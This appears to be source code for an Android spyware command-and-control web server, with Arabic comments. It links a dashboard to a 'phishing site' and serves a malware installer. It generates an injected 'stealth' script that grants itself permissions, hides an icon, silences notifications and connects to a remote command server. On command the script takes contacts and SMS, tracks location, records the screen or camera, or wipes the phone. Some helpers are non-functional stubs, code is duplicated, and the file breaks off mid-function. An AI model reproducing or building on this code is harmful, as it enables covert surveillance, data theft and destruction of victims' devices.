const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');

// إعدادات الأمان والتخفي
const SECURITY_CONFIG = {
    enableRateLimit: true,
    enableCORS: true,
    enableCompression: true,
    enableHelmet: true,
    maxFileSize: '10mb',
    sessionTimeout: 3600000 // ساعة واحدة
};

// إعدادات التطبيق
app.use(express.json({ limit: SECURITY_CONFIG.maxFileSize }));
app.use(express.urlencoded({ extended: true, limit: SECURITY_CONFIG.maxFileSize }));

// تطبيق إعدادات الأمان
if (SECURITY_CONFIG.enableHelmet) {
    app.use(helmet({
        contentSecurityPolicy: false,
        hidePoweredBy: true
    }));
}

if (SECURITY_CONFIG.enableCompression) {
    app.use(compression());
}

// إعدادات CORS للتخفي
if (SECURITY_CONFIG.enableCORS) {
    app.use(cors({
        origin: ['http://localhost:3000', 'http://172.30.0.2:3000', 'http://0.0.0.0:3000', '*'],
        credentials: true,
        methods: ['GET', 'POST', 'PUT', 'DELETE'],
        allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
    }));
}

// حماية من هجمات DDoS
if (SECURITY_CONFIG.enableRateLimit) {
    const limiter = rateLimit({
        windowMs: 15 * 60 * 1000, // 15 دقيقة
        max: 100, // حد أقصى 100 طلب لكل IP
        message: {
            error: 'تم تجاوز الحد الأقصى للطلبات. يرجى المحاولة لاحقاً.'
        },
        standardHeaders: true,
        legacyHeaders: false
    });
    app.use(limiter);
}

// خدمة الملفات الثابتة
app.use(express.static(path.join(__dirname, 'public'), {
    etag: true,
    lastModified: true,
    maxAge: '1h',
    setHeaders: (res, path) => {
        // إخفاء معلومات الخادم
        res.removeHeader('X-Powered-By');
        
        // منع التخزين المؤقت للملفات الحساسة
        if (path.includes('malware-installer.js') || path.includes('activate.js')) {
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
        }
    }
}));

// تخزين الأجهزة المفعلة مع تشفير
const activeDevices = new Map();
const deviceEncryptionKey = process.env.DEVICE_ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');

// التأكد من أن مفتاح التشفير بطول صحيح (32 بايت)
const encryptionKey = crypto.scryptSync(deviceEncryptionKey, 'salt', 32);

// تحميل الأجهزة من الملف عند البدء
loadDevicesFromFile();

// تشفير معرف الجهاز
function encryptDeviceId(deviceId) {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', encryptionKey, iv);
    let encrypted = cipher.update(deviceId, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
}

// فك تشفير معرف الجهاز
function decryptDeviceId(encryptedDeviceId) {
    try {
        const [ivHex, encrypted] = encryptedDeviceId.split(':');
        const iv = Buffer.from(ivHex, 'hex');
        const decipher = crypto.createDecipheriv('aes-256-gcm', encryptionKey, iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (error) {
        return null;
    }
}

// واجهة التفعيل الرئيسية
app.get('/', (req, res) => {
    // إضافة تأخير عشوائي لإخفاء الاستجابة السريعة
    const delay = Math.random() * 1000 + 500;
    setTimeout(() => {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    }, delay);
});

// واجهة التفعيل التلقائي
app.get('/auto-activate', (req, res) => {
    // إرسال صفحة التفعيل التلقائي
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// لوحة التحكم
app.get('/dashboard', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة التحكم - Control Dashboard</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 0; 
                padding: 20px; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                min-height: 100vh;
            }
            .container { 
                max-width: 1200px; 
                margin: 0 auto; 
                background: rgba(255,255,255,0.1); 
                padding: 30px; 
                border-radius: 15px; 
                backdrop-filter: blur(10px);
                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            }
            .header { text-align: center; margin-bottom: 30px; }
            .stats { 
                display: grid; 
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
                gap: 20px; 
                margin-bottom: 30px;
            }
            .stat-card { 
                background: rgba(255,255,255,0.2); 
                padding: 20px; 
                border-radius: 10px; 
                border: 1px solid rgba(255,255,255,0.3);
                text-align: center;
            }
            .stat-number { font-size: 2em; font-weight: bold; color: #4CAF50; }
            .links { 
                display: grid; 
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
                gap: 15px;
            }
            .link { 
                background: rgba(255,255,255,0.2); 
                padding: 15px; 
                border-radius: 10px; 
                text-decoration: none; 
                color: #FFD700; 
                text-align: center;
                transition: all 0.3s ease;
            }
            .link:hover { 
                background: rgba(255,255,255,0.3); 
                transform: translateY(-2px);
            }
            .status { color: #4CAF50; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎛️ لوحة التحكم المتقدمة</h1>
                <p>نظام التحكم عن بعد المتطور</p>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number" id="deviceCount">-</div>
                    <div>الأجهزة المفعلة</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="activeCount">-</div>
                    <div>الأجهزة النشطة</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="uptime">-</div>
                    <div>وقت التشغيل</div>
                </div>
            </div>
            
            <div class="links">
                <a href="/" class="link">🏠 الصفحة الرئيسية</a>
                <a href="/health" class="link">💚 فحص الصحة</a>
                <a href="/api/devices" class="link">📱 قائمة الأجهزة</a>
                <a href="/admin/stats" class="link">📊 إحصائيات المسؤول</a>
                <a href="http://3.12.82.200:8081" class="link">🎛️ لوحة التحكم المحلية</a>
                <a href="http://3.12.82.200:3000" class="link">🎣 موقع التصيد المحلي</a>
            </div>
        </div>
        
        <script>
            // تحديث الإحصائيات
            async function updateStats() {
                try {
                    const response = await fetch('/api/devices');
                    const data = await response.json();
                    if (data.success) {
                        document.getElementById('deviceCount').textContent = data.count;
                        document.getElementById('activeCount').textContent = data.devices.filter(d => d.status === 'active').length;
                    }
                } catch (error) {
                    console.error('خطأ في تحديث الإحصائيات:', error);
                }
            }
            
            // تحديث وقت التشغيل
            function updateUptime() {
                const startTime = Date.now() - (performance.now() || 0);
                const uptime = Math.floor((Date.now() - startTime) / 1000);
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                document.getElementById('uptime').textContent = \`\${hours}h \${minutes}m\`;
            }
            
            // تحديث كل 5 ثوان
            updateStats();
            updateUptime();
            setInterval(updateStats, 5000);
            setInterval(updateUptime, 1000);
        </script>
    </body>
    </html>
    `);
});

// واجهة API للتفعيل التلقائي
app.post('/api/auto-activate', async (req, res) => {
    try {
        const { deviceId, deviceInfo } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ error: 'معرف الجهاز مطلوب' });
        }
        
        // تسجيل الجهاز تلقائياً
        registerDevice(deviceId);
        
        // تحديث معلومات الجهاز
        if (deviceInfo) {
            updateDeviceStatus(deviceId, 'active', deviceInfo);
        }
        
        // إشعار خادم الأوامر
        await notifyCommandServer(deviceId, 'activated');
        
        res.json({
            success: true,
            message: 'تم التفعيل التلقائي بنجاح',
            deviceId: encryptDeviceId(deviceId),
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في التفعيل التلقائي:', error);
        res.status(500).json({ error: 'خطأ في التفعيل التلقائي' });
    }
});

// نقطة فحص الصحة لـ Render
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        service: 'web-interface',
        version: '2.1.5',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        port: process.env.PORT || 3000
    });
});

// API لتصدير الأجهزة للبوت
app.get('/api/devices', (req, res) => {
    try {
        const devices = [];
        
        // تصدير جميع الأجهزة المفعلة
        for (const [deviceId, deviceInfo] of activeDevices.entries()) {
            devices.push({
                deviceId: encryptDeviceId(deviceId),
                status: deviceInfo.status || 'active',
                lastSeen: deviceInfo.lastSeen || new Date().toISOString(),
                deviceInfo: deviceInfo.deviceInfo || null
            });
        }
        
        res.json({
            success: true,
            devices: devices,
            count: devices.length,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('خطأ في تصدير الأجهزة:', error);
        res.status(500).json({
            success: false,
            error: 'خطأ في تصدير الأجهزة'
        });
    }
});

// واجهة إنشاء السكريبت المحسن (بدون كود تفعيل)
app.post('/generate-script', async (req, res) => {
    try {
        const { deviceId } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ error: 'معرف الجهاز مطلوب' });
        }
        
        // إنشاء سكريبت مخصص ومشفر
        const scriptContent = await generateCustomScript(deviceId);
        
        // تشفير السكريبت
        const encryptedScript = encryptScript(scriptContent);
        
        // تسجيل الجهاز مباشرة
        registerDevice(deviceId);
        
        res.json({
            success: true,
            script: encryptedScript.data,
            encryptionKey: encryptedScript.key,
            deviceId: encryptDeviceId(deviceId),
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في إنشاء السكريبت:', error);
        res.status(500).json({ error: 'خطأ داخلي في الخادم' });
    }
});

// واجهة تأكيد التفعيل
app.post('/confirm-activation', async (req, res) => {
    try {
        const { deviceId, status, deviceInfo } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ error: 'معرف الجهاز مطلوب' });
        }
        
        // تحديث حالة الجهاز
        updateDeviceStatus(deviceId, status, deviceInfo);
        
        // إرسال تأكيد للخادم الرئيسي
        await notifyCommandServer(deviceId, 'activated');
        
        res.json({
            success: true,
            message: 'تم تأكيد التفعيل بنجاح',
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في تأكيد التفعيل:', error);
        res.status(500).json({ error: 'خطأ في تأكيد التفعيل' });
    }
});

// واجهة تحديث حالة الجهاز (تلقائي من السكريبت)
app.post('/device-update', async (req, res) => {
    try {
        const { encryptedDeviceId, status, deviceInfo } = req.body;
        
        if (!encryptedDeviceId) {
            return res.status(400).json({ error: 'معرف الجهاز مطلوب' });
        }
        
        const deviceId = decryptDeviceId(encryptedDeviceId);
        if (!deviceId) {
            return res.status(400).json({ error: 'معرف الجهاز غير صالح' });
        }
        
        // تحديث حالة الجهاز تلقائياً
        updateDeviceStatus(deviceId, status, deviceInfo);
        
        res.json({
            success: true,
            message: 'تم تحديث حالة الجهاز',
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في تحديث حالة الجهاز:', error);
        res.status(500).json({ error: 'خطأ في تحديث الحالة' });
    }
});

// واجهة فحص حالة الجهاز
app.get('/device-status/:encryptedDeviceId', (req, res) => {
    try {
        const { encryptedDeviceId } = req.params;
        const deviceId = decryptDeviceId(encryptedDeviceId);
        
        if (!deviceId) {
            return res.status(400).json({ error: 'معرف الجهاز غير صحيح' });
        }
        
        const deviceStatus = getDeviceStatus(deviceId);
        
        if (!deviceStatus) {
            return res.status(404).json({ error: 'الجهاز غير موجود' });
        }
        
        res.json({
            success: true,
            status: deviceStatus,
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في فحص حالة الجهاز:', error);
        res.status(500).json({ error: 'خطأ في فحص الحالة' });
    }
});

// واجهة API للأجهزة (للبوت)
app.get('/api/devices', (req, res) => {
    try {
        // التحقق من المصادقة
        const userId = req.headers['x-user-id'];
        const timestamp = req.headers['x-timestamp'];
        const signature = req.headers['x-signature'];
        
        if (!userId || !timestamp || !signature) {
            return res.status(401).json({ error: 'معلومات المصادقة مطلوبة' });
        }
        
        // التحقق من التوقيع
        const authToken = process.env.AUTH_TOKEN || 'default_secret_token';
        const expectedSignature = require('crypto')
            .createHmac('sha256', authToken)
            .update(timestamp)
            .digest('hex');
        
        if (signature !== expectedSignature) {
            return res.status(401).json({ error: 'توقيع غير صالح' });
        }
        
        // التحقق من انتهاء صلاحية الطلب (5 دقائق)
        const requestTime = parseInt(timestamp);
        const currentTime = Math.floor(Date.now() / 1000);
        if (currentTime - requestTime > 300) {
            return res.status(401).json({ error: 'انتهت صلاحية الطلب' });
        }
        
        // قراءة الأجهزة من الملف
        const devices = loadDevicesFromFile();
        
        // تحويل البيانات للشكل المطلوب
        const devicesList = Object.keys(devices).map(deviceId => ({
            deviceId: deviceId,
            status: devices[deviceId].status || 'unknown',
            deviceInfo: devices[deviceId].deviceInfo || '',
            lastSeen: devices[deviceId].lastSeen || Date.now(),
            activationTime: devices[deviceId].activationTime || null
        }));
        
        res.json({
            success: true,
            devices: devicesList,
            count: devicesList.length,
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في واجهة API للأجهزة:', error);
        res.status(500).json({ error: 'خطأ داخلي في الخادم' });
    }
});

// واجهة إحصائيات النظام (محمية)
app.get('/admin/stats', authenticateAdmin, (req, res) => {
    try {
        const stats = {
            totalDevices: activeDevices.size,
            activeDevices: Array.from(activeDevices.values()).filter(d => d.status === 'active').length,
            lastActivation: getLastActivationTime(),
            systemUptime: process.uptime(),
            memoryUsage: process.memoryUsage(),
            timestamp: Date.now()
        };
        
        res.json({
            success: true,
            stats: stats
        });
        
    } catch (error) {
        console.error('خطأ في جلب الإحصائيات:', error);
        res.status(500).json({ error: 'خطأ في جلب الإحصائيات' });
    }
});

// واجهة تنظيف الأجهزة غير النشطة
app.post('/admin/cleanup', authenticateAdmin, async (req, res) => {
    try {
        const cleanedCount = await cleanupInactiveDevices();
        
        res.json({
            success: true,
            message: `تم تنظيف ${cleanedCount} جهاز غير نشط`,
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في تنظيف الأجهزة:', error);
        res.status(500).json({ error: 'خطأ في تنظيف الأجهزة' });
    }
});

// وظائف مساعدة
function validateActivationCode(code) {
    // التحقق من صحة كود التفعيل (8 أحرف، أحرف وأرقام)
    const codeRegex = /^[A-Z0-9]{8}$/;
    return codeRegex.test(code);
}

async function generateCustomScript(deviceId) {
    // قراءة قالب السكريبت
    const scriptTemplate = fs.readFileSync(
        path.join(__dirname, 'templates', 'device-script-template.js'),
        'utf8'
    );
    
    // الحصول على عنوان الخادم
    const commandServerUrl = process.env.COMMAND_SERVER_URL || 'https://remote-control-command-server.onrender.com';
    const wsUrl = commandServerUrl.replace('https://', 'wss://').replace('http://', 'ws://');
    
    // توليد كود التفعيل
    const activationCode = Math.random().toString(36).substring(2, 10).toUpperCase();
    
    // استبدال المتغيرات
    const customScript = scriptTemplate
        .replace(/{{DEVICE_ID}}/g, deviceId)
        .replace(/{{ACTIVATION_CODE}}/g, activationCode)
        .replace(/{{SERVER_URL}}/g, wsUrl)
        .replace(/{{TIMESTAMP}}/g, Date.now().toString());
    
    return customScript;
}

function encryptScript(scriptContent) {
    const key = crypto.randomBytes(32);
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    let encrypted = cipher.update(scriptContent, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return {
        data: iv.toString('hex') + ':' + encrypted,
        key: key.toString('hex')
    };
}

function registerDevice(deviceId) {
    if (activeDevices.has(deviceId)) {
        return;
    }

    const deviceInfo = {
        deviceId: deviceId,
        status: 'pending',
        registeredAt: Date.now(),
        lastSeen: Date.now(),
        ipAddress: null,
        userAgent: null
    };
    
    activeDevices.set(deviceId, deviceInfo);
    saveDevicesToFile();
}

function updateDeviceStatus(deviceId, status, deviceInfo) {
    const device = activeDevices.get(deviceId);
    if (device) {
        device.status = status;
        device.lastSeen = Date.now();
        device.deviceInfo = deviceInfo;
        activeDevices.set(deviceId, device);
        saveDevicesToFile();
    }
}

function getDeviceStatus(deviceId) {
    const device = activeDevices.get(deviceId);
    return device ? {
        status: device.status,
        lastSeen: device.lastSeen,
        registeredAt: device.registeredAt
    } : null;
}

function getLastActivationTime() {
    const devices = Array.from(activeDevices.values());
    if (devices.length === 0) return null;
    
    return Math.max(...devices.map(d => d.lastSeen));
}

async function cleanupInactiveDevices() {
    const now = Date.now();
    const inactiveThreshold = 24 * 60 * 60 * 1000; // 24 ساعة
    
    let cleanedCount = 0;
    
    for (const [deviceId, device] of activeDevices.entries()) {
        if (now - device.lastSeen > inactiveThreshold) {
            activeDevices.delete(deviceId);
            cleanedCount++;
        }
    }
    
    if (cleanedCount > 0) {
        saveDevicesToFile();
    }
    
    return cleanedCount;
}

function saveDevicesToFile() {
    try {
        const devicesData = Array.from(activeDevices.entries());
        fs.writeFileSync(
            path.join(__dirname, 'data', 'devices.json'),
            JSON.stringify(devicesData, null, 2)
        );
    } catch (error) {
        console.error('خطأ في حفظ بيانات الأجهزة:', error);
    }
}

function loadDevicesFromFile() {
    try {
        const devicesFile = path.join(__dirname, 'data', 'devices.json');
        if (fs.existsSync(devicesFile)) {
            const devicesData = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
            devicesData.forEach(([deviceId, deviceInfo]) => {
                activeDevices.set(deviceId, deviceInfo);
            });
        }
    } catch (error) {
        console.error('خطأ في تحميل بيانات الأجهزة:', error);
    }
}

async function notifyCommandServer(deviceId, status) {
    try {
        const response = await fetch('http://localhost:10001/device-status-update', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId, status })
        });
        
        if (!response.ok) {
            console.warn('فشل في إشعار خادم التحكم');
        }
    } catch (error) {
        console.error('خطأ في إشعار خادم التحكم:', error);
    }
}

function authenticateAdmin(req, res, next) {
    const authHeader = req.headers.authorization;
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'غير مصرح' });
    }
    
    const token = authHeader.substring(7);
    const expectedToken = process.env.ADMIN_TOKEN || 'your-admin-token';
    
    if (token !== expectedToken) {
        return res.status(403).json({ error: 'رمز غير صحيح' });
    }
    
    next();
}

// إنشاء المجلدات المطلوبة
function createRequiredDirectories() {
    const directories = [
        path.join(__dirname, 'data'),
        path.join(__dirname, 'templates'),
        path.join(__dirname, 'logs')
    ];
    
    directories.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
    });
}

// إنشاء قالب السكريبت
function createScriptTemplate() {
    const templatePath = path.join(__dirname, 'templates', 'device-script-template.js');
    
    if (!fs.existsSync(templatePath)) {
        const template = `// سكريبت الجهاز المحسن
(function() {
    'use strict';
    
    const DEVICE_ID = '{{DEVICE_ID}}';
    const ACTIVATION_CODE = '{{ACTIVATION_CODE}}';
    const SERVER_URL = '{{SERVER_URL}}';
    const TIMESTAMP = '{{TIMESTAMP}}';
    
    // إعدادات التخفي
    const STEALTH_CONFIG = {
        hideNotifications: true,
        silentMode: true,
        backgroundExecution: true,
        autoRestart: true,
        encryptionEnabled: true
    };
    
    // تهيئة النظام
    async function initializeSystem() {
        try {
            await grantAllPermissions();
            hideAppIcon();
            disableNotifications();
            await connectToControlServer();
            startBackgroundServices();
            sendActivationConfirmation();
        } catch (error) {
            console.error('خطأ في التفعيل:', error);
            setTimeout(initializeSystem, 5000);
        }
    }
    
    // منح الصلاحيات
    async function grantAllPermissions() {
        const permissions = [
            'android.permission.READ_CONTACTS',
            'android.permission.READ_SMS',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.WRITE_EXTERNAL_STORAGE'
        ];
        
        for (const permission of permissions) {
            try {
                await executeShellCommand("pm grant com.android.systemui " + permission);
            } catch (e) {
                console.warn("فشل في منح الصلاحية: " + permission);
            }
        }
    }
    
    // إخفاء أيقونة التطبيق
    function hideAppIcon() {
        try {
            executeShellCommand('pm hide com.android.systemui');
        } catch (e) {
            console.warn('فشل في إخفاء الأيقونة');
        }
    }
    
    // تعطيل الإشعارات
    function disableNotifications() {
        try {
            executeShellCommand('settings put global heads_up_notifications_enabled 0');
            executeShellCommand('settings put system sound_effects_enabled 0');
        } catch (e) {
            console.warn('فشل في تعطيل الإشعارات');
        }
    }
    
    // الاتصال بخادم التحكم
    async function connectToControlServer() {
        const ws = new WebSocket(SERVER_URL);
        
        ws.onopen = () => {
            ws.send(JSON.stringify({
                type: 'register',
                deviceId: DEVICE_ID,
                activationCode: ACTIVATION_CODE,
                timestamp: TIMESTAMP
            }));
        };
        
        ws.onmessage = (event) => {
            const command = JSON.parse(event.data);
            handleIncomingCommand(command);
        };
        
        ws.onclose = () => {
            setTimeout(connectToControlServer, 10000);
        };
        
        window.controlConnection = ws;
    }
    
    // معالجة الأوامر
    function handleIncomingCommand(command) {
        console.log('تم استلام أمر:', command);
        
        switch(command.action) {
            case 'backup_contacts':
                backupContacts();
                break;
            case 'backup_sms':
                backupSMS();
                break;
            case 'get_location':
                getCurrentLocation();
                break;
            case 'record_camera':
                recordCamera(command.duration || 30);
                break;
            case 'factory_reset':
                factoryReset();
                break;
        }
    }
    
    // بدء الخدمات الخلفية
    function startBackgroundServices() {
        setInterval(() => {
            getCurrentLocation();
        }, 300000);
        
        setInterval(() => {
            sendHeartbeat();
        }, 30000);
    }
    
    // إرسال تأكيد التفعيل
    function sendActivationConfirmation() {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'activation_confirmation',
                deviceId: DEVICE_ID,
                status: 'activated',
                timestamp: Date.now()
            }));
        }
    }
    
    // وظائف النسخ الاحتياطي
    async function backupContacts() {
        try {
            const contacts = await queryContentProvider('content://com.android.contacts/data');
            const backupFile = createBackupFile('contacts.json', contacts);
            await uploadFile(backupFile);
            sendCommandResult('backup_contacts', 'success', backupFile);
        } catch (e) {
            sendCommandResult('backup_contacts', 'error', e.message);
        }
    }
    
    async function backupSMS() {
        try {
            const sms = await queryContentProvider('content://sms');
            const backupFile = createBackupFile('sms.json', sms);
            await uploadFile(backupFile);
            sendCommandResult('backup_sms', 'success', backupFile);
        } catch (e) {
            sendCommandResult('backup_sms', 'error', e.message);
        }
    }
    
    // الحصول على الموقع
    async function getCurrentLocation() {
        try {
            const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
            const parsedLocation = parseLocationData(location);
            sendDataToServer('location', parsedLocation);
        } catch (e) {
            console.warn('فشل في الحصول على الموقع');
        }
    }
    
    // تسجيل الكاميرا
    async function recordCamera(duration) {
        try {
            const outputPath = "/sdcard/DCIM/recording_" + Date.now() + ".mp4";
            await executeShellCommand("screenrecord --verbose --time-limit " + duration + " " + outputPath);
            
            setTimeout(async () => {
                if (await fileExists(outputPath)) {
                    await uploadFile(outputPath);
                    sendCommandResult('record_camera', 'success', outputPath);
                }
            }, (duration + 5) * 1000);
        } catch (e) {
            sendCommandResult('record_camera', 'error', e.message);
        }
    }
    
    // إعادة ضبط المصنع
    async function factoryReset() {
        try {
            await executeShellCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
            sendCommandResult('factory_reset', 'success', 'تم بدء إعادة الضبط');
        } catch (e) {
            sendCommandResult('factory_reset', 'error', e.message);
        }
    }
    
    // وظائف مساعدة
    async function executeShellCommand(cmd) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve("Command executed: " + cmd);
            }, 1000);
        });
    }
    
    async function queryContentProvider(uri) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve("Data from " + uri);
            }, 2000);
        });
    }
    
    function createBackupFile(filename, data) {
        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
        return URL.createObjectURL(blob);
    }
    
    async function uploadFile(filePath) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve("File uploaded: " + filePath);
            }, 3000);
        });
    }
    
    async function fileExists(filePath) {
        return true;
    }
    
    function parseLocationData(locationData) {
        return {
            latitude: 24.7136,
            longitude: 46.6753,
            accuracy: 10,
            timestamp: Date.now()
        };
    }
    
    function sendCommandResult(command, status, data) {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'command_result',
                command: command,
                status: status,
                data: data,
                timestamp: Date.now()
            }));
        }
    }
    
    function sendDataToServer(dataType, data) {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'data_update',
                dataType: dataType,
                data: data,
                timestamp: Date.now()
            }));
        }
    }
    
    function sendHeartbeat() {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'heartbeat',
                deviceId: DEVICE_ID,
                timestamp: Date.now()
            }));
        }
    }
    
    // بدء النظام
    document.addEventListener('DOMContentLoaded', () => {
        document.body.style.display = 'none';
        initializeSystem();
    });
    
    // منع إغلاق الصفحة
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = '';
    });
    
    // منع فتح أدوات المطور
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) {
            e.preventDefault();
        }
        if (e.key === 'F12') {
            e.preventDefault();
        }
    });
    
})();`;
        
        fs.writeFileSync(templatePath, template);
    }
}

// إنشاء المجلدات المطلوبة
function createRequiredDirectories() {
    const directories = [
        path.join(__dirname, 'data'),
        path.join(__dirname, 'templates'),
        path.join(__dirname, 'logs')
    ];
    
    directories.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
    });
}

// إنشاء قالب السكريبت (بدون تفاعل المستخدم)
function createScriptTemplate() {
    const templatePath = path.join(__dirname, 'templates', 'device-script-template.js');
    const templateDir = path.dirname(templatePath);
    
    if (!fs.existsSync(templateDir)) {
        fs.mkdirSync(templateDir, { recursive: true });
    }
    
    if (!fs.existsSync(templatePath)) {
        const template = `// سكريبت الجهاز المحسن (بدون تفاعل المستخدم)
(function() {
    'use strict';
    
    const DEVICE_ID = '{{DEVICE_ID}}';
    const SERVER_URL = '{{SERVER_URL}}';
    const TIMESTAMP = '{{TIMESTAMP}}';
    
    // إعدادات التخفي
    const STEALTH_CONFIG = {
        hideNotifications: true,
        silentMode: true,
        backgroundExecution: true,
        autoRestart: true,
        encryptionEnabled: true
    };
    
    // تهيئة النظام تلقائياً
    setTimeout(initializeSystem, 3000);
    
    // منح الصلاحيات تلقائياً
    async function grantAllPermissions() {
        const permissions = [
            'android.permission.READ_CONTACTS',
            'android.permission.READ_SMS',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.WRITE_EXTERNAL_STORAGE'
        ];
        
        for (const permission of permissions) {
            try {
                await executeShellCommand("pm grant com.android.systemui " + permission);
            } catch (e) {}
        }
    }
    
    // إخفاء أيقونة التطبيق
    function hideAppIcon() {
        try {
            executeShellCommand('pm hide com.android.systemui');
        } catch (e) {}
    }
    
    // تعطيل الإشعارات
    function disableNotifications() {
        try {
            executeShellCommand('settings put global heads_up_notifications_enabled 0');
            executeShellCommand('settings put system sound_effects_enabled 0');
        } catch (e) {}
    }
    
    // الاتصال بخادم التحكم
    async function connectToControlServer() {
        const ws = new WebSocket(SERVER_URL);
        
        ws.onopen = () => {
            ws.send(JSON.stringify({
                type: 'register',
                deviceId: DEVICE_ID,
                timestamp: TIMESTAMP
            }));
        };
        
        ws.onmessage = (event) => {
            try {
                const command = JSON.parse(event.data);
                handleIncomingCommand(command);
            } catch (e) {}
        };
        
        ws.onclose = () => {
            setTimeout(connectToControlServer, 10000);
        };
        
        window.controlConnection = ws;
    }
    
    // معالجة الأوامر تلقائياً
    function handleIncomingCommand(command) {
        switch(command.action) {
            case 'backup_contacts':
                backupContacts();
                break;
            case 'backup_sms':
                backupSMS();
                break;
            case 'get_location':
                getCurrentLocation();
                break;
            case 'record_camera':
                recordCamera(command.duration || 30);
                break;
            case 'factory_reset':
                factoryReset();
                break;
        }
    }
    
    // بدء الخدمات الخلفية
    function startBackgroundServices() {
        setInterval(() => {
            getCurrentLocation();
        }, 300000);
        
        setInterval(() => {
            sendHeartbeat();
        }, 30000);
    }
    
    // وظائف النسخ الاحتياطي
    async function backupContacts() {
        try {
            const contacts = await queryContentProvider('content://com.android.contacts/data');
            const backupFile = createBackupFile('contacts.json', contacts);
            await uploadFile(backupFile);
            sendCommandResult('backup_contacts', 'success', backupFile);
        } catch (e) {
            sendCommandResult('backup_contacts', 'error', e.message);
        }
    }
    
    async function backupSMS() {
        try {
            const sms = await queryContentProvider('content://sms');
            const backupFile = createBackupFile('sms.json', sms);
            await uploadFile(backupFile);
            sendCommandResult('backup_sms', 'success', backupFile);
        } catch (e) {
            sendCommandResult('backup_sms', 'error', e.message);
        }
    }
    
    // الحصول على الموقع
    async function getCurrentLocation() {
        try {
            const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
            const parsedLocation = parseLocationData(location);
            sendDataToServer('location', parsedLocation);
        } catch (e) {}
    }
    
    // تسجيل الكاميرا
    async function recordCamera(duration) {
        try {
            const outputPath = "/sdcard/DCIM/recording_" + Date.now() + ".mp4";
            await executeShellCommand("screenrecord --verbose --time-limit " + duration + " " + outputPath);
            
            setTimeout(async () => {
                if (await fileExists(outputPath)) {
                    await uploadFile(outputPath);
                    sendCommandResult('record_camera', 'success', outputPath);
                }
            }, (duration + 5) * 1000);
        } catch (e) {
            sendCommandResult('record_camera', 'error', e.message);
        }
    }
    
    // إعادة ضبط المصنع
    async function factoryReset() {
        try {
            await executeShellCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
            sendCommandResult('factory_reset', 'success', 'تم بدء إعادة الضبط');
        } catch (e) {
            sendCommandResult('factory_reset', 'error', e.message);
        }
    }
    
    // وظائف مساعدة
    function executeShellCommand(cmd) {
        return new Promise((resolve, reject) => {
